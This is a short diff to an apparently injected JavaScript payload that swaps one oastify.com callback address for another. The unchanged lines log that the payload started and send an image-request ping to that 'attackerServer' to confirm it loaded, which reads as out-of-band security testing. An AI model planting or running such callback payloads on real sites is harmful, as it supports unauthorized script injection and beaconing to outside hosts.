@@ -2,7 +2,7 @@
 (function() {
   console.log('[PAYLOAD STARTED]');
   
-  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com';
+  const attackerServer = 'https://zbep18gsm9fp0t6yz65jwqd5uw0nolca.oastify.com';
   
   // Test 1: Simple ping to verify payload loads
   (new Image()).src = attackerServer + '/ping?status=loaded';
